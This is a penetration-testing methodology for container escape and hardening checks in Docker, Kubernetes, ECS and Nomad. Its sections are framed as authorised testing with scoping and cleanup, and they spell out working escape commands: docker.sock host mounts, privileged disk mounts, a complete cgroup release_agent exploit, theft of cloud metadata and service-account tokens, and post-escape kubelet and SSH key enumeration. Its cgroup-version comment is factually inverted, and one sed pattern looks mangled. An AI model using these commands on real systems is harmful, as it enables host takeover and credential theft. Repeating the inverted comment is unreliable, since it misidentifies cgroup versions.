```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

> This methodology targets **the container/runtime layer itself** - fingerprinting, hardening verification, and escape testing against a specific running container - independent of what's orchestrating it (standalone Docker host, Kubernetes pod, ECS task, Nomad allocation). It picks up wherever a foothold inside a container already exists (via `exec`, a webshell, or an exploited application vulnerability) and works outward toward the host and beyond.
>
> This is deliberately decoupled from orchestrator-level concerns (RBAC, NetworkPolicy, admission control, cluster exposure) - see [[Kubernetes & Container Testing]] for that layer on Kubernetes specifically, or [[AWS Testing#8 - Container & Kubernetes Deep-Dive|AWS Testing §8]] for ECS/EKS-specific IAM identity plumbing. This doc is what either of those hands off to once a specific container needs hands-on testing.
>
> Each section includes: **purpose/context**, **possible vulnerabilities**, **instructions/commands**, and **what a positive finding looks like**. [[#9 - Testing Multiple Containers at Scale|§9]] covers how to apply this methodology across a fleet of containers rather than one at a time.

---

## 0 - Scoping & Access Prep
### Scoping Questions
- Which orchestrator(s) are in play, and does that change how a shell is obtained? (`kubectl exec`, `docker exec`, `aws ecs execute-command`, `nomad alloc exec`, or SSH to a host followed by `docker exec`)
- Is a foothold already provided (test credentials/exec access to a representative container), or does this start from an application-layer vulnerability that needs to be exploited first to get a shell?
- Is actually completing an escape to the host in scope, or is this a hardening review that stops at "this would be exploitable"? (mirrors the same distinction in [[AWS Testing#8.7 - Simulated Container Compromise & Escape Testing]])
- How many containers/images are in scope? A handful of representative workloads, or full-fleet coverage? Drives [[#9 - Testing Multiple Containers at Scale|§9]] vs section-by-section manual work
- Are any containers production, with real users/data, where a crash, restart, or resource spike would cause real impact?
- Is the underlying host/node itself in scope if an escape succeeds, or should testing stop at "escape confirmed, don't pivot further"?
- Who is the technical point of contact if a test causes a container restart, OOM-kill, or unexpected host impact?

### Access Model
| Orchestrator | Getting a shell | Equivalent "exec into a new throwaway container on the same host/node" |
| --- | --- | --- |
| Kubernetes | `kubectl exec -it <pod> -n <ns> -- sh` | `kubectl debug -it <pod> --image=nicolaka/netshoot --target=<container> --share-processes` (sidecar) or `kubectl debug node/<node> -it --image=nicolaka/netshoot` (node) |
| Docker (standalone host) | `docker exec -it <container> sh` | `docker run --rm -it --pid=container:<id> --net=container:<id> nicolaka/netshoot` |
| AWS ECS | `aws ecs execute-command --cluster <c> --task <t> --container <name> --interactive --command "/bin/sh"` | No direct sidecar equivalent - fall back to SSH onto the underlying EC2 instance (EC2 launch type only; not possible on Fargate) |
| Nomad | `nomad alloc exec -i -t <alloc-id> <task> /bin/sh` | `nomad alloc exec` into a separately scheduled debug job on the same node |

- Prefer the least invasive option available for the orchestrator in play - a sidecar/debug container that doesn't modify the target is always preferable to writing anything into the target's own filesystem (see [[#5 - Low-Footprint Testing Workflow]])
- Confirm what happens on disconnect - does `exec` leave a lingering shell/process, and does the orchestrator auto-restart containers on crash in a way that could wipe evidence mid-test?

### Tooling Setup
```bash
kubectl version --client       # if K8s
docker version                  # if standalone Docker host testing
```
- No client-side package installs are strictly required for most of this methodology - §5 is built specifically to avoid needing tools pre-installed in the target
- See [[#10 - Tooling]] for the optional tools that speed up repeated/bulk testing

---

## 1 - Container Fingerprinting & Recon
### Purpose
Before testing any escape technique, confirm you're actually inside a container (not a VM or bare host by mistake), identify the container runtime/engine and kernel version, and gather the baseline facts that determine which escape techniques are even *applicable* - testing a cgroup v1-specific technique against a cgroup v2 host wastes time and risks noisy failed attempts.

### Possible Vulnerabilities
- Verbose `/etc/os-release`, `uname -a`, or application banners leaking exact kernel/runtime versions useful for exploit selection
- Container orchestration metadata (env vars, mounted files) revealing internal hostnames, cluster names, or other containers' identities

### Commands
```bash
# Confirm you're actually in a container
cat /proc/1/cgroup
ls -la /.dockerenv 2>/dev/null
cat /proc/self/cgroup

# cgroup version - determines which escape techniques in §6 are applicable
stat -fc %T /sys/fs/cgroup/ 2>/dev/null   # "cgroup2fs" = v1, "tmpfs" = v2 unified hierarchy typically mounted differently
mount | grep cgroup

# Kernel / OS version - cross-reference against §12 known CVEs
uname -a
cat /etc/os-release
cat /proc/version

# Container runtime identification (socket path differs by engine)
ls -la /var/run/docker.sock /run/containerd/containerd.sock /run/crio/crio.sock 2>/dev/null

# Hostname/env hints about the orchestration layer
hostname
env | grep -iE 'kubernetes|k8s|ecs|nomad|container'
```

### What to Look For
- `/proc/1/cgroup` showing a path other than `/` confirms containerisation (a bare host's PID 1 cgroup path is just `/`)
- cgroup v1 confirmed → the `release_agent` technique in [[#6 - Known Escape Techniques|§6]] is in scope to test if `CAP_SYS_ADMIN` is also present
- Old kernel version (especially pre-5.8 for Dirty Pipe, or specific runc versions for CVE-2019-5736/CVE-2024-21626) → prioritise those specific checks in §12
- Docker socket present but containerd/CRI-O socket absent (or vice versa) tells you which exploitation commands in §6 to actually use

---

## 2 - Privilege & Capability Enumeration
### Purpose
Determine exactly what the container's process can do relative to the kernel - this is the single biggest factor in whether any escape technique will work at all, and it's readable with binaries present in virtually every base image.

### Possible Vulnerabilities
- `privileged: true` / `--privileged` - full device access, all capabilities, SELinux/AppArmor disabled, seccomp disabled
- Dangerous individual capabilities retained even in a non-privileged container: `CAP_SYS_ADMIN` (mount, numerous escapes), `CAP_SYS_PTRACE` (inspect/inject into other processes, powerful combined with `hostPID`), `CAP_SYS_MODULE` (load kernel modules directly), `CAP_NET_RAW` (raw socket crafting/sniffing), `CAP_DAC_READ_SEARCH`/`CAP_DAC_OVERRIDE` (bypass file permission checks)
- Running as root (`uid=0`) inside the container, lowering the bar for every other technique in this doc
- No seccomp profile applied (`Unconfined`), or an AppArmor/SELinux profile set to `unconfined`

### Commands
```bash
# Effective capabilities - no capsh/tool required
cat /proc/1/status | grep CapEff
cat /proc/self/status | grep -E 'CapEff|CapBnd'

# Decode the hex capability mask if capsh isn't available
python3 -c "print(hex(0x00000000a80425fb))"   # swap in the CapEff value; cross-reference against capability bit list

# If capsh happens to be present (don't install it just for this)
capsh --print

# Current user / root check
id

# Seccomp / AppArmor status
cat /proc/self/status | grep Seccomp
cat /proc/self/attr/current 2>/dev/null   # AppArmor profile, if applicable

# Privileged-mode indicators (device access is the giveaway)
ls -la /dev | wc -l     # a long list of host devices strongly suggests --privileged
mount | grep -i '/dev'
```

### What to Look For
- `CapEff` includes `cap_sys_admin`, `cap_sys_ptrace`, `cap_sys_module`, or the mask corresponds to "all capabilities" (`0000003fffffffff` on older kernels, `0000001ffffbffff`-style full masks depending on kernel capability count)
- `Seccomp: 0` (disabled) rather than `2` (filtered)
- A long, host-like `/dev` listing - a strong signal of `--privileged`/`privileged: true` even before checking the pod/task spec
- `id` returning `uid=0(root)` with no `runAsNonRoot` equivalent enforced

---

## 3 - Namespace Isolation Checks
### Purpose
Confirm whether the container actually has its own isolated PID/network/IPC namespaces, or whether it shares them with the host - each shared namespace removes a layer of isolation an escape technique would otherwise have to defeat.

### Possible Vulnerabilities
- `hostPID: true` / `--pid=host` - the container can see and potentially `ptrace`/signal every process on the host
- `hostNetwork: true` / `--network=host` - the container shares the host's network stack entirely, including binding to host ports and sniffing host traffic
- `hostIPC: true` / `--ipc=host` - shared memory segments/semaphores with host processes, occasionally exploitable for data leakage between processes
- `hostUTS` - shares the host's hostname/domain namespace (lower severity, mostly an information disclosure concern)

### Commands
```bash
# PID namespace - if you see host processes (sshd, host-level cron, kubelet, dockerd) you're sharing hostPID
ps aux
ls /proc | grep -E '^[0-9]+$' | wc -l    # a large number of PIDs visible is a strong hostPID indicator

# Network namespace - host's real interfaces/IPs visible means hostNetwork
ip a
cat /proc/net/tcp    # compare bound ports against what the container's own app should be using

# IPC namespace
ipcs -m   # listing host shared memory segments indicates shared IPC namespace

# UTS namespace
hostname
```

### What to Look For
- `ps aux` showing process names/counts that clearly belong to the host or other workloads (eg. `kubelet`, `dockerd`, `containerd-shim` processes for *other* containers) - confirms `hostPID`
- `ip a` returning the node's real interface names (`eth0` with the node's actual IP, or physical NIC names rather than a container's typical `eth0@if<N>` veth pairing) - confirms `hostNetwork`
- Combined with `CAP_SYS_PTRACE` from §2, a confirmed `hostPID` is a direct path to injecting into/dumping memory from host processes - see [[#6 - Known Escape Techniques|§6]]

---

## 4 - Filesystem & Mount Analysis
### Purpose
Enumerate what's actually mounted into the container - this is where most practical, config-driven (not kernel-exploit-driven) escapes live.

### Possible Vulnerabilities
- Docker/containerd socket mounted in (`/var/run/docker.sock`, `/run/containerd/containerd.sock`) - near-instant host compromise, covered in depth in §6
- Writable `hostPath`/bind-mounts of sensitive host directories (`/etc`, `/var/lib/kubelet`, `/var/lib/docker`, systemd unit directories, cron directories)
- Root filesystem writable (`readOnlyRootFilesystem` not set) - not an escape by itself, but removes a layer of defence-in-depth and enables easier tampering/persistence
- Host device files passed through (`/dev/sda`, `/dev/mem`, `/dev/kmem`) allowing raw disk/memory access

### Commands
```bash
mount
cat /proc/1/mountinfo
findmnt 2>/dev/null   # nicer formatting if available, not required

# Explicitly check for the sockets
ls -la /var/run/docker.sock /run/containerd/containerd.sock /run/crio/crio.sock 2>/dev/null

# Flag anything mounted from outside the container's own overlay/image layers
mount | grep -vE 'overlay|tmpfs|proc|sysfs|devpts|mqueue|cgroup|shm'

# Writability check on anything suspicious found above
touch /host-mount-path/test-write-$(date +%s) 2>&1   # confirm rw before assuming ro

# Raw device passthrough
ls -la /dev | grep -vE 'null|zero|random|urandom|tty|pts|console|ptmx|shm|mqueue|fd|stdin|stdout|stderr'
```

### What to Look For
- The Docker/containerd socket present *and* actually connectable (not just visible in `mount` - permission could still deny access, test per §6)
- A `touch` succeeding against a host-backed mount outside the expected application data directories
- Device files beyond the standard minimal set (`null`, `zero`, `random`, `tty`, etc.) - raw disk (`sd*`) or memory (`mem`, `kmem`) devices are critical findings on their own

---

## 5 - Low-Footprint Testing Workflow
### Purpose
A repeatable, tiered approach to actually running escape techniques without installing packages into the target container or leaving binaries behind on disk. Work through tiers in order and stop as soon as there's enough evidence for the finding - don't reach for a bundled tool when a built-in command already proves the point.

### Tier 1 - Built-ins Already in the Image (zero footprint)
Everything in §1-4 above uses only binaries already present in almost any base image (`sh`, `cat`, `ls`, `mount`, `ps`, `ip`), including minimal `alpine`/`distroless` images for the simplest checks. This alone confirms most static-review findings are real, often without needing anything further.

### Tier 2 - Ephemeral/Sidecar Debug Container (nothing added to the target itself)
If the target has no shell (distroless) or deeper tooling (`deepce`, `amicontained`, `capsh`) is genuinely needed, attach a short-lived container that shares the target's namespaces instead of modifying the target's own filesystem:
```bash
# Kubernetes - sidecar in the same pod, sharing process namespace
kubectl debug -it <pod> -n <ns> --image=nicolaka/netshoot --target=<container> --share-processes -- sh
# inspect the target's PID 1 mounts/environment via /proc/<pid>/root and /proc/<pid>/environ
ls -la /proc/1/root/var/run/docker.sock
cat /proc/1/environ | tr '\0' '\n'

# Standalone Docker host - equivalent using a throwaway container sharing namespaces with the target
docker run --rm -it --pid=container:<target-id> --net=container:<target-id> nicolaka/netshoot sh
```
- Kubernetes caveat: ephemeral containers can't be individually removed - they persist in the pod spec until the pod is deleted/recreated. Fine for test/throwaway pods; get explicit agreement before attaching one to a production pod, and log every one created for cleanup
- Requires `pods/ephemeralcontainers` create permission on Kubernetes - absence of this permission is itself a scoping constraint worth noting, fall back to Tier 1/3

### Tier 3 - Node/Host-Level Debug Session (bypasses the target container entirely)
For checks that are really about the *host* (docker.sock reachability from the host side, kubelet API, host filesystem) rather than one specific container, get onto the node/host directly instead of exec-ing into a workload at all:
```bash
# Kubernetes - schedules a pod directly on the target node, chroots into /host by default
kubectl debug node/<node-name> -it --image=nicolaka/netshoot
chroot /host
ls -la /var/run/docker.sock

# Standalone Docker host - if SSH access to the host is in scope
ssh <host>
docker ps -a   # now talking to the real daemon directly, no container escape needed to prove this layer
```
- Cleaner for reporting - the finding becomes "the node itself exposes X" rather than "pod Y happened to expose X"
- Always delete the debug pod/session when done (`kubectl get pods | grep node-debug`, then `kubectl delete pod <name>`)

### Tier 4 - Memory-Only Binary (last resort)
If a specific PoC genuinely needs a binary inside the *target* container that Tier 1-3 can't substitute for, drop it into a tmpfs-backed path rather than the container's writable layer - `/dev/shm` or `/tmp` are RAM-backed on virtually all default configurations, so nothing touches node disk and there's no package-manager "install" step:
```bash
# Confirm it's actually tmpfs first - if not, fall back to Tier 2 instead of writing to the real layer
mount | grep /dev/shm

kubectl cp ./amicontained <ns>/<pod>:/dev/shm/ac   # or `docker cp` for standalone Docker
kubectl exec -it <pod> -n <ns> -- sh -c 'chmod +x /dev/shm/ac && /dev/shm/ac; rm -f /dev/shm/ac'
```
- Always `rm` the binary immediately after running it, in the same command chain, so nothing survives a crash or early disconnect

### Socket Interaction Without curl
If `curl` isn't present in the container, `sh`/`bash` can speak raw HTTP over a Unix socket using only shell built-ins:
```bash
exec 3<>/var/run/docker.sock
printf 'GET /containers/json HTTP/1.0\r\n\r\n' >&3
cat <&3
```

### What to Look For
- Tier 1 output already confirming a static finding is real and exploitable, requiring nothing further
- Tier 2/3 successfully reading the target's mounts/process tree via `/proc/<pid>/root`, or a host chroot/shell giving full node filesystem access
- **Cleanup check before moving on to the next container**: no leftover ephemeral containers on production pods, no dropped binaries under `/dev/shm`/`/tmp`, no debug pods/sessions left running

---

## 6 - Known Escape Techniques
> Each technique lists the preconditions found in §2-4 that make it viable - check those first rather than attempting every technique against every container.

### Docker/Containerd Socket Exploitation
- **Preconditions**: socket mounted in and writable (§4)
- **Commands**:
```bash
# Docker socket
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
docker -H unix:///var/run/docker.sock run -v /:/host -it --rm alpine chroot /host sh

# Containerd socket (no docker CLI needed - ctr talks to it directly if present, otherwise use the raw socket)
ctr -a /run/containerd/containerd.sock containers list
```
- **What confirms it**: a new container (or `chroot`) giving a shell with the **host's** root filesystem mounted at `/host` - full host compromise

### Privileged Container Device/Host Mount Escape
- **Preconditions**: `privileged: true` confirmed in §2, host devices visible in §4
- **Commands**:
```bash
# Mount the host's root disk device directly (device name varies - check `ls /dev` from §4 first)
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host sh
```
- **What confirms it**: successful mount and `chroot` into what is clearly the host's filesystem (check `/mnt/host/etc/hostname` matches the node, not the container)

### cgroup v1 `release_agent` Escape
- **Preconditions**: `CAP_SYS_ADMIN` confirmed in §2, cgroup v1 confirmed in §1
- **Commands** (classic technique - mounts a fresh cgroup, registers a `release_agent` script that runs on the host when the cgroup empties):
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
printf '#!/bin/sh\nid > /output 2>&1\n' > /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"    # triggers release_agent on the host
cat /output
```
- **What confirms it**: `/output` contains the result of a command (`id`) that ran with the **host's** privileges, not the container's

### `hostPID` + `CAP_SYS_PTRACE` Process Injection
- **Preconditions**: both confirmed in §2/§3
- **Commands**:
```bash
ps aux   # identify a privileged host process to target
gdb -p <host-pid>   # if gdb available; otherwise use /proc/<pid>/mem direct manipulation
# or simpler confirmation without full injection:
cat /proc/<host-pid>/environ | tr '\0' '\n'    # read another process's environment (secrets, tokens)
```
- **What confirms it**: successfully reading environment variables or memory of a process that doesn't belong to this container, proving namespace isolation is broken for process visibility

### Kernel Module Loading
- **Preconditions**: `CAP_SYS_MODULE` confirmed in §2
- **Commands**:
```bash
# Confirming reachability is usually sufficient for the finding - don't actually load an untrusted module on a client's host
insmod --help 2>/dev/null; which insmod
ls /lib/modules/$(uname -r)/ 2>/dev/null
```
- **What confirms it**: `CAP_SYS_MODULE` present combined with kernel module tooling reachable - document as a critical finding without necessarily loading a real module against production infrastructure

### Known runc/Kernel CVEs
- **CVE-2019-5736** (runc container breakout via `/proc/self/exe` overwrite) and **CVE-2024-21626** (`WORKDIR`/fd leak allowing host filesystem access) - both require checking the exact runc version in use; public PoCs exist for both but should only be run against disposable/lab infrastructure to confirm the version is genuinely vulnerable, not production
- **Dirty Pipe (CVE-2022-0847)** - kernel versions 5.8 up to patched point, allows overwriting read-only files via a page cache race; check kernel version from §1 against the advisory before attempting
- Treat all of the above as "check version against advisory, confirm in a lab/throwaway workload first" rather than default production-safe tests - see [[#12 - Known CVE & Escape Reference]]

---

## 7 - Credential & Secret Harvesting From a Compromised Container
### Purpose
Once inside (or having escaped), establish what credentials were reachable just by being in this specific container - this is usually more valuable to report than the escape technique itself, since it defines the actual blast radius.

### Possible Vulnerabilities
- Plaintext secrets in environment variables (`env`) or mounted files
- Kubernetes service account tokens auto-mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`
- Cloud workload identity tokens (IRSA, Azure Workload Identity, GKE Workload Identity) reachable and usable against the cloud provider's API
- Cloud instance metadata service reachable from inside the container (confirms a broader *node* identity is reachable, not just the workload's own scoped identity)

### Commands
```bash
env
find / -xdev -type f \( -iname '*secret*' -o -iname '*credential*' -o -iname '*.pem' -o -iname '*.key' \) 2>/dev/null

# Kubernetes service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces

# Cloud metadata reachability (cloud-agnostic sweep)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --max-time 2       # AWS IMDS
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01" --max-time 2   # Azure IMDS
curl -s -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" --max-time 2   # GCP metadata
```

### What to Look For
- Any credential obtained here that's broader than the single workload needs - feed it back into the relevant cloud methodology's privilege-escalation section (eg. [[AWS Testing#2.4 - Privilege Escalation Paths]]) to confirm the real blast radius
- Cloud metadata reachable at all from inside the container (rather than being blocked at the network layer) is itself a finding independent of what the resulting credential can do

---

## 8 - Post-Escape Host Actions
### Purpose
If an escape in §6 succeeded, establish how far the compromise actually reaches on the host before stopping - this defines the real severity of the finding.

### Possible Vulnerabilities
- Full host compromise exposing **every other container's** filesystem, environment, and secrets, not just the one that was escaped from
- Host-level credentials (kubelet client cert, node IAM role, SSH host keys) reachable once on the host
- Ability to pivot to other nodes via the container orchestrator's own control plane communication

### Commands
```bash
# Once on the host (via any §6 technique) - enumerate other running containers
docker ps -a   # or `crictl ps` on containerd/CRI-O-only hosts without the docker CLI
docker inspect <other-container-id>   # pull its env, mounts, and image for comparison

# Kubelet credentials on a Kubernetes node
ls -la /var/lib/kubelet/pki/
cat /var/lib/kubelet/kubeconfig 2>/dev/null

# Host SSH keys / other persistence-relevant material (document reachability, don't exfiltrate beyond proving access)
ls -la /root/.ssh/ /etc/ssh/
```

### What to Look For
- Access to secrets/environment variables belonging to **other** containers on the same host that the original container had no business reaching - this is the headline finding for a successful escape
- A usable kubelet client certificate or kubeconfig, which typically grants broad node-level API access
- Confirm whether the compromise is contained to this one host/node or whether it extends further (control plane reachability, shared storage) - escalate to [[Kubernetes & Container Testing#10 - Lateral Movement, Pivoting & Persistence]] for the cluster-wide continuation of this chain

---

## 9 - Testing Multiple Containers at Scale
### Purpose
A real engagement often has dozens to thousands of running containers. Walking through §1-8 interactively against every single one isn't feasible in a time-boxed window - this section is how to keep the same depth of testing while covering a large fleet.

### Approach
- **Triage before touching anything.** Pull a bulk config dump (`kubectl get pods -A -o json`, `docker inspect $(docker ps -q)`, or the equivalent for the orchestrator in play) and rank containers by risk signal *before* any interactive session: privileged flag, docker.sock/sensitive hostPath mounts, dangerous capabilities, `hostPID`/`hostNetwork`, known-vulnerable image CVEs, and network exposure. This reuses the same static-review output already gathered under [[Kubernetes & Container Testing#3 - Workload & Pod Security Configuration]] if testing a Kubernetes cluster.
- **Dedup by template.** Containers spawned from the same image/Deployment/task definition share the same runtime posture almost always. Test one representative per template thoroughly, then spot-check 2-3 additional instances for configuration drift (a different env var, a manually-added volume mount) rather than repeating the full methodology against every replica. Report drift as its own finding category if found.
- **Run a non-interactive Tier 1 sweep across everything first.** Script the zero-footprint checks from §1-4 (capabilities, mounts, cgroup version, namespace sharing) across every shortlisted container in one batch, rather than manually `exec`-ing into each one. Collect output into a single file per container (or one combined file) for diffing and triage:

```bash
# Example: Kubernetes-wide Tier 1 sweep, bounded concurrency to avoid hammering the API server
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{"\n"}{end}' > targets.txt

cat targets.txt | xargs -P 10 -L 1 sh -c '
  ns="$1"; pod="$2"
  echo "=== $ns/$pod ===" >> sweep-results.txt
  kubectl exec "$pod" -n "$ns" -- sh -c "
    cat /proc/1/status | grep CapEff
    mount | grep -E \"docker.sock|containerd.sock\"
    cat /proc/1/cgroup
  " >> sweep-results.txt 2>&1
' _
```
- Adjust `-P` (parallelism) down on smaller/shared clusters to avoid self-inflicted load issues against the API server or nodes - this is itself a form of DoS risk if run too aggressively, confirm acceptable concurrency with the client first per §0
- The equivalent for a fleet of standalone Docker hosts: loop `docker inspect` output through `jq` to extract `.HostConfig.Privileged`, `.HostConfig.CapAdd`, `.Mounts`, across every host in scope

- **Reserve interactive/Tier 2-4 testing for the shortlist only.** Only run actual escape attempts (§5 Tier 2-4, §6 technique execution) against containers the bulk sweep and static review flagged as plausibly exploitable - not every container in the fleet. This keeps manual effort proportional to actual risk rather than spread evenly and thinly.
- **Track cleanup centrally.** Keep a single running list (a scratch file is fine) of every ephemeral container, sidecar, debug pod, and dropped tmpfs binary created across the whole sweep - end-of-engagement cleanup should be one pass through that list, not something reconstructed from memory per container.
- **Report aggregate + exemplar**, consistent with [[Kubernetes & Container Testing#11 - Scaling for Large Clusters]]: for a finding that repeats across many containers (eg. "38 of 112 containers run privileged"), give the aggregate count plus 2-3 concrete, named exemplars (ideally including the one(s) where escape was actually confirmed) rather than a line-by-line list of all 112.

---

## 10 - Tooling

| Tool | Summary | Useful For | Install |
| ---- | ------- | ---------- | ------- |
| [deepce](https://github.com/stealthcopter/deepce) | Docker/container enumeration script | Fast in-container enumeration of capabilities, mounts, and escape vectors (§2-4), typically run via a Tier 2/4 session | `curl` the single script - see [repo](https://github.com/stealthcopter/deepce) |
| [amicontained](https://github.com/genuinetools/amicontained) | Container introspection tool (capabilities, namespaces, seccomp, AppArmor) | Quick structured summary of what an escape attempt has to work with (§2-3) | [Install guide](https://github.com/genuinetools/amicontained#installation) |
| [CDK](https://github.com/cdk-team/CDK) | Zero-dependency container penetration and escape toolkit (single static binary) with built-in evaluate/exploit modules for many known escape techniques | Automating detection and exploitation of the techniques in §6 at speed, especially useful when run via the Tier 4 memory-only method since it's one self-contained binary | [Install guide](https://github.com/cdk-team/CDK#install) (download the static release binary) |
| [BOtB (Break out the Box)](https://github.com/brompwnie/botb) | Container analysis and exploitation tool covering a range of known escape techniques | Second opinion / cross-validation of CDK's findings, structured escape-technique checklist (§6) | [Install guide](https://github.com/brompwnie/botb#installation) |
| [netshoot](https://github.com/nicolaka/netshoot) | Network/container troubleshooting image bundling common CLI tools (curl, nmap, tcpdump, etc.) | Default image for Tier 2/3 sidecar and node debug sessions - brings tooling onto a pod/node without altering the target (§5) | `docker pull nicolaka/netshoot` (pulled automatically by `kubectl debug --image=nicolaka/netshoot`) |
| [Trivy](https://github.com/aquasecurity/trivy) | Vulnerability, misconfig, and secret scanner for images | Image-level scanning before live testing even starts - feeds the triage step in [[#9 - Testing Multiple Containers at Scale|§9]] | [Install guide](https://trivy.dev/latest/getting-started/installation/) |
| [capsh](https://man7.org/linux/man-pages/man1/capsh.1.html) (libcap2-bin) | Capability shell wrapper, decodes capability bitmasks into readable names | Readable capability output when available - not worth installing into a target just for this, prefer the `/proc/*/status` + manual decode shown in §2 | Usually already present on Debian/Ubuntu-based images via `libcap2-bin`; avoid installing into a target container solely to use it |

---

## 11 - Manual Enumeration Cheat Sheet

| Goal | Command(s) | Notes |
| ---- | ---------- | ----- |
| Confirm containerised | `cat /proc/1/cgroup` | A non-`/` path confirms it |
| Effective capabilities | `cat /proc/1/status \| grep CapEff` | No tooling required |
| Current user | `id` | |
| Seccomp status | `cat /proc/self/status \| grep Seccomp` | `0` = disabled |
| PID namespace sharing | `ps aux` | Host/other-workload processes visible = `hostPID` |
| Network namespace sharing | `ip a` | Node's real interfaces visible = `hostNetwork` |
| Mounted filesystems | `mount` or `cat /proc/1/mountinfo` | Look for sockets, hostPath binds |
| Docker/containerd socket present | `ls -la /var/run/docker.sock /run/containerd/containerd.sock` | |
| tmpfs-backed scratch space | `mount \| grep /dev/shm` | Confirms before Tier 4 memory-only drop |
| Env-based secrets | `env` | |
| K8s service account token | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` | |
| Cloud metadata reachable | `curl -s http://169.254.169.254/latest/meta-data/ --max-time 2` | AWS shown; swap path for Azure/GCP per §7 |
| Ephemeral debug container (K8s) | `kubectl debug -it <pod> --image=nicolaka/netshoot --target=<c> --share-processes` | Persists in pod spec until pod recreated |
| Node-level debug session (K8s) | `kubectl debug node/<node> -it --image=nicolaka/netshoot` | Chroots to `/host` by default |

---

## 12 - Known CVE & Escape Reference
> Confirm the exact runtime/kernel version in use before relying on any of these, and only execute PoCs for unpatched CVEs against disposable/lab infrastructure unless the client has explicitly authorised testing against production.

- **CVE-2019-5736** - runc container breakout via `/proc/self/exe` overwrite, allowing a malicious container to overwrite the host `runc` binary
- **CVE-2024-21626** - runc working-directory file descriptor leak allowing host filesystem access from a built/run container
- **CVE-2022-0847 ("Dirty Pipe")** - Linux kernel page-cache race allowing overwriting of read-only files, including host binaries reachable from within a container sharing the host kernel
- **CVE-2020-15257** - containerd `containerd-shim` API exposed on the container's network namespace, allowing host-level code execution if reachable
- cgroup v1 `release_agent` abuse (no single CVE - a design characteristic of cgroup v1 combined with `CAP_SYS_ADMIN`, see §6)
- Always cross-check current advisories rather than relying solely on this list:
	- [Kubernetes official CVE feed](https://kubernetes.io/docs/reference/issues-security/official-cve-feed/)
	- [runc GitHub Security Advisories](https://github.com/opencontainers/runc/security/advisories)
	- [NVD search for "container escape"](https://nvd.nist.gov/vuln/search/results?query=container+escape)

---

## 13 - Reference Frameworks
- [MITRE ATT&CK Containers Matrix](https://attack.mitre.org/matrices/enterprise/containers/) - useful for framing escape chains as attack paths rather than isolated technique checks
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [NSA/CISA Kubernetes Hardening Guidance](https://www.cisa.gov/resources-tools/resources/kubernetes-hardening-guidance) - the orchestrator-level counterpart, see [[Kubernetes & Container Testing]]
- Cross-reference cloud-specific identity/IMDS concerns: [[AWS Testing#8.3 - IMDS Exposure|AWS Testing §8.3]]
